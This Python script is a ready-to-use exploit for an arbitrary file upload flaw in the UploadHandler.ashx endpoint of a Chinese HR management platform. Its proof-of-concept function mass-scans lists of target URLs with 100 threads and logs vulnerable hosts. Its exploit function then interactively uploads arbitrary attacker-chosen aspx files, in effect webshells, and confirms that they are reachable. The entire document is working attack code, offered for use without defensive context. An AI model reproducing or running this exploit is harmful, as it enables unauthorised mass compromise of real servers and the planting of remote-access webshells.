import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type: 同享人力管理管理平台UploadHandler存在任意文件上传漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="同享人力管理管理平台UploadHandler存在任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/Handler/UploadHandler.ashx?folder=Uploadfile2"
    headers = {
        "accept": "*/*",
        "Content-Type": "multipart/form-data;boundary=---------------------------123",
        "Content-Length": "174",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close"
    }
    data = """-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="1.php"
Content-Type: text/plain

123456789
-----------------------------123--
    """

    res1 = requests.get(url=target,verify=False,timeout=5)
    try:
        res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200:
            if res2.text == "1":
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"[+]{target}存在任意文件上传漏洞\n")

                    f.close()
                    print(f"[+]{target}存在任意文件上传漏洞")
                    return True
            else:
                print(f"[-]{target}不存在任意文件上传漏洞")
        else:
            print("网站访问超时，请手工测试！！")
    except Exception as e:
        print(e)
def exp(target):
    while True:
        try:
            payload = "/Handler/UploadHandler.ashx?folder=Uploadfile2"
            headers = {
                "accept": "*/*",
                "Content-Type": "multipart/form-data;boundary=---------------------------123",
                "Content-Length": "174",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Te": "trailers",
                "Connection": "close"
            }
            filename = input("请输入要上传的文件名(仅限aspx文件):\n>>>>>>>>>>>>>>")
            file = input("请输入要上传的文件内容:\n>>>>>>>>>>>>>>")
            url = f"{target}/Handler/Uploadfile2/{filename}"
            data = f"""-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="{filename}"
Content-Type: text/plain

{file}
-----------------------------123--
                """
            proxies = {
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080"
            }
            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
            if res2.text == "1":
                res3 = requests.get(url=url,verify=False,timeout=5)
                if res3.status_code == 200 and res3.text == file:
                        print(f"文件上传成功!!!\n路径为{url}")
                        cmd = input(f"输入1继续上传文件，0退出\n>>>>>>>>>>>>>>>>>>")
                        if cmd == "0":
                            exit()
                        else:
                            pass
                else:
                    print("文件上传失败!!!")
        except Exception as e:
            print(e)





if __name__ == '__main__':
    main()